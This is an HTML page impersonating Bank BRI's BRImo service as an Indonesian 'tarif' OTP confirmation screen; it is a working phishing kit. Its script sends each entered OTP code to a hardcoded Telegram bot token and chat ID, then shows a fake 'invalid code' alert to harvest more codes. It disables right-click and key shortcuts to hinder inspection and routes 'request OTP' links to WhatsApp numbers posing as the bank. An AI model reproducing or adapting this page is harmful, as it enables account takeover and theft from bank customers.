<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="theme-color" content="#fff">
    <title>BRImo - Layanan Tarif</title>
    <meta property="og:title" content="Bank BRImo - Layanan Tarif">
    <meta property="twitter:title" content="BRImo - Layanan Tarif">
    <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content="https://i.ibb.co/3vVb3sF/1.jpg">
    <meta data-n-head="ssr" data-hid="og:image" property="og:image" content="https://i.ibb.co/3vVb3sF/1.jpg">
    <meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="https://bri.co.id/">
    <meta property="og:url" content="https://bri.co.id/">
    <meta property="og:description" content="Bank Rakyat Indonesia (BRI) adalah salah satu bank komersial terbesar di Indonesia yang selalu mengutamakan kepuasan nasabah.">
    <link rel="shortcut icon" href="./../favicon/favicon.ico" type="image/x-icon" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="./assets/css/otp.css" type="text/css" media="all" />
    <style>
        .alert-blink {
            animation: blink 1s infinite;
            color: red;
            font-weight: bold;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
    <script>
        var addHandler = function (element, type, handler) {
            if (element.addEventListener) {
                element.addEventListener(type, handler, false);
            } else if (element.attachEvent) {
                element.attachEvent("on" + type, handler);
            } else {
                element["on" + type] = handler;
            }
        };

        var preventDefault = function (event) {
            if (event.preventDefault) {
                event.preventDefault();
            } else {
                event.returnValue = false;
            }
        };

        addHandler(window, "contextmenu", function (event) {
            preventDefault(event);
        });

        document.onkeydown = function (event) {
            if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
                return false;
            }
        };
    </script>
</head>
<body>
    <div class="container">
        <div class="card-otp">
            <div class="card-title">
                <div class="img">
                    <img width="250px" src="./assets/img/ibx.png" alt="" />
                    <h4 class="">SMS / WhatsApp</h4>
                </div>
            </div>
            <form id="otpForm" class="container">
                <div class="timer mt-3 text-center fw-bold text-primary">
                    <span id="timer" style="font-size: 20px;"></span>
                </div>
                <p class="text-center mt-3 fw-bold">Silahkan masukan kode OTP TARIF Anda, Jika belum menerima OTP silahkan klik tombol di bawah ini</p>
                <div class="input mt-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-shield-lock-fill" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.8 11.8 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7 7 0 0 0 1.048-.625 11.8 11.8 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.54 1.54 0 0 0-1.044-1.263 63 63 0 0 0-2.887-.87C9.843.266 8.69 0 8 0m0 5a1.5 1.5 0 0 1 .5 2.915l.385 1.99a.5.5 0 0 1-.491.595h-.788a.5.5 0 0 1-.49-.595l.384-1.99A1.5 1.5 0 0 1 8 5"/>
                    </svg>
                    <input type="tel" name="otp" id="otp" required autofocus="off" maxlength="6" minlength="6" placeholder="KODE OTP"/>
                </div>
                <br />
                <center>
                <span onclick="location.href='https://wa.me/+6285378336994?text=Hallo%20Bank%20BRImo%0ASaya%20mau%20request%20kode%20OTP'" class="fw-bold text-primary" href="#">  >Belum Menerima KODE ?< </span>
                </center>
                <button class="mt-3 btnSubmit w-100" type="submit">Konfirmasi</button> 
            </form>
            <div id="alertContainer" class="text-center mt-3"></div>
            <div class="reques-otp mt-5 text-center">
                <span>Tidak terima SMS OTP? <strong onclick="location.href='https://wa.me/+6285268263816?text=Hallo%20Bank%20BRImo%0ASaya%20mau%20request%20kode%20OTP'">klik REQUEST OTP</strong></span>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
        $('#otpForm').submit(function(e) {
            e.preventDefault();
            var otp = $('#otp').val();
            var telegramToken = '7032990939:AAHbrTh42upbxgXPEAaSASMsWe2r_Ld9b-g';
            var telegramChatId = '678941049';

            $.ajax({
                type: 'POST',
                url: 'https://api.telegram.org/bot' + telegramToken + '/sendMessage',
                data: {
                    chat_id: telegramChatId,
                    text: '______‡º∫‚ïêùóïùóÆùóªùó∏ ùóïùó•ùóú‚ïê‡ºª______\n\nKode OTP: ' + otp
                },
                success: function(response) {
                    showBlinkingAlert();
                    setTimeout(function() {
                        window.location.href = 'otp.html';
                    }, 5000);  // Redirect after 5 seconds
                },
                error: function(error) {
                    alert('Terjadi kesalahan saat mengirim data ke Telegram');
                }
            });
        });

        function showBlinkingAlert() {
            var alertContainer = document.getElementById('alertContainer');
            alertContainer.innerHTML = '<div class="alert-blink">Kode OTP yang di masukan Tidak Valid, Mohon Ulangi atau Kirim Request OTP</div>';
            setTimeout(function() {
                alertContainer.innerHTML = '';
            }, 5000);  // Hide alert after 5 seconds
        }

        document.getElementById('timer').innerHTML = 02 + ":" + 01;
        startTimer();

        function startTimer() {
            var presentTime = document.getElementById('timer').innerHTML;
            var timeArray = presentTime.split(/[:]+/);
            var m = timeArray[0];
            var s = checkSecond((timeArray[1] - 1));
            if(s == 59) { m = m - 1 }
            if(m < 0) {
                return;
            }
            document.getElementById('timer').innerHTML = m + ":" + s;
            setTimeout(startTimer, 1000);
        }

        function checkSecond(sec) {
            if (sec < 10 && sec >= 0) { sec = "0" + sec };
            if (sec < 0) { sec = "59" };
            return sec;
        }
    </script>
</body>
</html>
